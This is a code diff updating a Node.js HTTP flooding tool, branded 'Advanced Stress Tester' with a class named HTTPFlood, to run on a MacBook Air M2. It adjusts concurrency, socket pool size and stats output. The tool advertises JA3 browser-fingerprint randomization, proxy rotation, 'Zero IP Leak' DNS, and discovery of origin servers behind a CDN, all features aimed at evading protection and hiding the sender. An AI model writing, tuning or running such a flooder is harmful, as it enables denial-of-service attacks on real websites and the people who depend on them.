@@ -15,11 +15,11 @@ const { URL } = require('url');
 
 const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
-║    ADVANCED STRESS TESTER V5.2 - ULTRA FAST             ║
-║    Unlimited Sockets + Zero IP Leak + CF Optimized       ║
-║    ✓ 6 Concurrent/Thread   ✓ Smart Proxy Health         ║
-║    ✓ DoH DNS Resolution    ✓ Connection Pooling         ║
-║    ✓ JA3 Randomization     ✓ 20K+ RPS Capable           ║
+║    ADVANCED STRESS TESTER V5.3 - M2 OPTIMIZED           ║
+║    MacBook Air M2 Edition + Zero IP Leak                 ║
+║    ✓ 4 Concurrent/Thread   ✓ Smart Proxy Health         ║
+║    ✓ DoH DNS Resolution    ✓ 256 Socket Pool            ║
+║    ✓ JA3 Randomization     ✓ 10-30K RPS Capable         ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -222,7 +222,7 @@ function createTLSAgent(profile, proxyUrl = null) {
         sessionTimeout: 300,
         keepAlive: true,
         keepAliveMsecs: 1000,
-        maxSockets: Infinity,
+        maxSockets: 256,
         maxFreeSockets: 10,
         timeout: 5000,
         scheduling: 'fifo'
@@ -549,11 +549,14 @@ function displayStats() {
         ? ((config.stats.http2Requests / config.stats.totalRequests) * 100).toFixed(1)
         : 0;
     
+    const memUsage = process.memoryUsage();
+    const memMB = (memUsage.heapUsed / 1024 / 1024).toFixed(0);
+    
     console.log('\n' + '='.repeat(70));
-    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests} | Rate: ${reqRate.toFixed(1)} req/s`);
-    console.log(`[STATS] Success: ${config.stats.successful} (${successRate}%) | Failed: ${config.stats.failed}`);
+    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests.toLocaleString()} | Rate: ${reqRate.toFixed(0)} req/s`);
+    console.log(`[STATS] Success: ${config.stats.successful.toLocaleString()} (${successRate}%) | Failed: ${config.stats.failed.toLocaleString()}`);
     console.log(`[STATS] HTTP/2: ${config.stats.http2Requests} (${http2Percent}%) | Conn Reuse: ${config.stats.connectionReuse}`);
-    console.log(`[STATS] Sent: ${(config.stats.bytesSent / 1024).toFixed(1)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(1)} KB`);
+    console.log(`[STATS] Memory: ${memMB}MB | Sent: ${(config.stats.bytesSent / 1024).toFixed(0)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(0)} KB`);
     
     if (Object.keys(config.stats.statusCodes).length > 0) {
         const codes = Object.entries(config.stats.statusCodes)
@@ -589,14 +592,19 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: ULTRA-FAST (6 concurrent/thread)`);
+        console.log(`[*] Mode: M2 OPTIMIZED (4 concurrent/thread)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
         console.log(`[*] Protocol: Optimized HTTP/1.1 (3000ms timeout)`);
-        console.log(`[*] Connection: Unlimited sockets + Keep-Alive`);
+        console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         
-        const estimatedRPS = this.threads * 200;
-        console.log(`[*] Estimated throughput: ${estimatedRPS}-${estimatedRPS * 3} req/s`);
+        const estimatedRPS = Math.min(this.threads * 100, 30000);
+        console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${(estimatedRPS * 1.5).toLocaleString()} req/s`);
+        
+        if (this.threads > 100) {
+            console.log(`[!] WARNING: ${this.threads} threads may overwhelm MacBook Air M2`);
+            console.log(`[!] Recommended: 50-100 threads for optimal performance`);
+        }
         
         if (this.useOrigin && this.domain) {
             this.originIPs = await discoverOriginIPs(this.domain);
@@ -605,6 +613,11 @@ class HTTPFlood {
         if (config.proxies.length > 0) {
             console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
             console.log(`[!] Enable debug mode to see first requests and errors`);
+            
+            if (this.threads > 150) {
+                console.log(`[!] MacBook Air M2: Consider using 50-100 threads for stability`);
+            }
+            
             config.workingProxies.clear();
         } else {
             console.log('[!] WARNING: Direct connection - your IP is visible!');
@@ -624,7 +637,7 @@ class HTTPFlood {
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = 6;
+            const concurrent = 4;
             const requests = [];
             
             for (let i = 0; i < concurrent; i++) {
@@ -712,6 +725,8 @@ class HTTPFlood {
             }
             
             await Promise.allSettled(requests);
+            
+            await new Promise(resolve => setTimeout(resolve, 5));
             
             if (localCount % 50 === 0 && currentProxy) {
                 const health = config.proxyHealth.get(currentProxy);
